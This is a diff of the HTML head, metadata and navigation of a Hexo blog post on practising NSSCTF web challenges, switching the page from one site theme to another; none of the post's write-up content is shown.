@@ -1,388 +1,279 @@
 <!DOCTYPE html>
-<html lang=en>
+<html lang="en">
+
 <head>
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="NSSCTF web 刷题，督促自己用的，图就不放了，好麻烦嘤嘤嘤 [SWPU 2018]SimplePHP  一眼任意文件读取 获取目录下的文件 index.php  function.php 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php &#x2F;&#x2F;show_source(__FILE__">
-<meta property="og:type" content="article">
-<meta property="og:title" content="NSS-web刷题">
-<meta property="og:url" content="http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/index.html">
-<meta property="og:site_name" content="Meteor_Kai">
-<meta property="og:description" content="NSSCTF web 刷题，督促自己用的，图就不放了，好麻烦嘤嘤嘤 [SWPU 2018]SimplePHP  一眼任意文件读取 获取目录下的文件 index.php  function.php 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php &#x2F;&#x2F;show_source(__FILE__">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129090655640.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129090754383.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129090905238.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129091157168.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129094525150.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129152014405.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129153324392.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129153330890.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129153602396.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129154720280.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129154816344.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129162734692.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129162758249.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129185322665.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201081543495.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201081821727.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201081952743.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201082223713.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201082453677.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201082658543.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201090321285.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201162019665.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201162431475.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201162925243.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201163048605.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201165516664.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201195030922.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241201195811853.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202091606567.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202093801748.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202093817078.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202093953244.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202113409968.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202113436817.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202113745659.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202113809806.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202120310235.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202135053653.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202141718720.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202191229996.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202191236455.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202192140294.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202192401696.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202192427751.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202192500153.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202192515347.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202192532428.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241202195010229.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203142059441.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203150323022.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203151646902.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203151737374.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203151855387.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203152039720.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203152536667.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203153252371.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203154849744.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203155021110.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203155429796.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203155415823.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241203163625594.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241204183506892.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241204183619864.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241204183641915.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241204190138226.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241204191236394.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241204191947252.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241204192022368.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205101557977.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205102042424.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205105221482.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205184800886.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205184816327.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205185132883.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205190842283.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205195913384.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205202211925.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205202303024.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206105852832.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206135001872.png">
-<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/88f0ac4113ccb65120ad8a4bb3409bda.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206135214358.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206162301273.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206162320564.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206170630174.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206170818784.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206181457145.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241206182342197.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241207183625856.png">
-<meta property="og:image" content="https://i-blog.csdnimg.cn/blog_migrate/b64eaf07acb79400eb4758495127f5a9.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241207191631376.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241211091858315.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241211092027384.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241211150618302.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241211194627392.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241211194704771.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241213210502761.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241216165920626.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241216170014770.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241216173859525.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241216174248130.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217102936436.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217162221344.png">
-<meta property="og:image" content="http://49.232.222.195/usr/uploads/2024/01/3143471657.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217162431715.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217162525349.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217162550738.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217183017666.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217183108043.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217183711068.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217184946236.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217185044193.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217191850648.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241217194810760.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241218143940345.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241218144520020.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241218150653705.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241218150726126.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241218164943899.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241220124913426.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241220124906163.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241220125010556.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241220205948150.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241220210832925.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221130223596.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221130251349.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221131100031.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221132103107.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221132132933.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221210444624.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221210459298.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241221210551031.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222093337918.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222093344765.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222093408857.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222093449718.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222102504323.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222102518573.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222102526079.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222102639428.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222111208334.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222112240952.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222112644143.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222112807470.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222113111949.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222161153662.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222161704265.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222161718945.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222162400463.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222164000955.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241222163953824.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223104912732.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223104936822.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223105009974.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223105356197.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223113609841.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223113620325.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223130449675.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223130528458.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223165932556.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223170940953.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223171201655.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223172100977.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241223172424946.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241224110506682.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241224110501121.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241225153946378.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241225155117505.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241225155204995.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241227153626689.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241227153710490.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241230171141882.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241230171148314.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241231103913709.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241231104320343.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101090545818.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101090618525.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101090736212.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101091459532.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101091449658.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101091544695.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101085153202.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101085554674.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250101085700376.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104115507603.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104115941234.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104120856200.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104120932581.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104120944656.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104221216421.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104223600499.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104224546154.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104225223289.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250104225321393.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250105082600584.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250105083934681.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250105160042913.png">
-<meta property="og:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20250105160338220.png">
-<meta property="article:published_time" content="2025-02-15T05:49:02.000Z">
-<meta property="article:modified_time" content="2025-04-03T06:51:38.151Z">
-<meta property="article:author" content="Meteor_Kai">
-<meta property="article:tag" content="杂">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="c:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241129090655640.png">
-    
-    
-      
-        
-          <link rel="shortcut icon" href="/images/favicon.ico">
-        
-      
-      
-        
-          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-        
-      
-      
-        
-          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-        
-      
-    
-    <!-- title -->
-    <title>NSS-web刷题</title>
-    <!-- async scripts -->
-    <!-- Google Analytics -->
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="Meteor_Kai">
 
 
-    <!-- Umami Analytics -->
+
+    <meta name="description" content="Just Hack For Fun...">
 
 
-    <!-- styles -->
-    
-<link rel="stylesheet" href="/css/style.css">
+    <meta name="keywords" content="Web exploits bring me great joy!">
 
-    <!-- persian styles -->
+
+<title>NSS-web刷题 | Meteor_Kai</title>
+
+
+
+    <link rel="icon" href="/favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
     
-    <!-- rss -->
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
     
     
-	<!-- mathjax -->
-	
-		<script type="text/x-mathjax-config">
-		  MathJax.Hub.Config({
-			tex2jax: {
-			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
-			  inlineMath: [['$','$']]
-			}
-		  });
-		</script>
-		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
-	
+        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+    "HTML-CSS": {
+        preferredFont: "TeX",
+        availableFonts: ["STIX","TeX"],
+        linebreaks: { automatic:true },
+        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
+        processEscapes: true,
+        ignoreClass: "tex2jax_ignore|dno",
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+        equationNumbers: { autoNumber: "AMS" },
+        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
+        Macros: { href: "{}" }
+    },
+    messageStyle: "none"
+    });
+</script>
+<!-- 给MathJax元素添加has-jax class -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+<!-- 通过连接CDN加载MathJax的js代码 -->
+<script type="text/javascript" async
+        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
+</script>
+
+
+    
+
+
 <meta name="generator" content="Hexo 7.3.0"></head>
 
-<body class="max-width mx-auto px3 ltr">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-        <!--
-       --><li><a href="/">Home</a></li><!--
-     --><!--
-       --><li><a href="/about/">About me</a></li><!--
-     --><!--
-       --><li><a href="/archives/">Writing</a></li><!--
-     --><!--
-       --><li><a target="_blank" rel="noopener" href="https://github.com/MeteorKai/">Projects</a></li><!--
-     --><!--
-       --><li><a href="/search/">Search</a></li><!--
-     --><!--
-       --><li><a href="/categories/">categories</a></li><!--
-     --><!--
-       --><li><a href="/tags/">tags</a></li><!--
-     --><!--
-       --><li><a href="/links/">links</a></li><!--
-     -->
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" aria-label="Previous post" href="/2025/02/16/VNCTF2025-Web-wp/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" aria-label="Next post" href="/2025/01/25/ctfshow%E5%85%83%E6%97%A6%E6%B8%97%E9%80%8F%E8%B5%9Bwp/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">Previous post</span>
-      <span id="i-next" class="info" style="display:none;">Next post</span>
-      <span id="i-top" class="info" style="display:none;">Back to top</span>
-      <span id="i-share" class="info" style="display:none;">Share post</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/&text=NSS-web刷题"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/&title=NSS-web刷题"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/&is_video=false&description=NSS-web刷题"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=NSS-web刷题&body=Check out this article: http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/&title=NSS-web刷题"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://meteorkai.github.io/2025/02/15/NSS-web%E5%88%B7%E9%A2%98/&title=NSS-web刷题"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
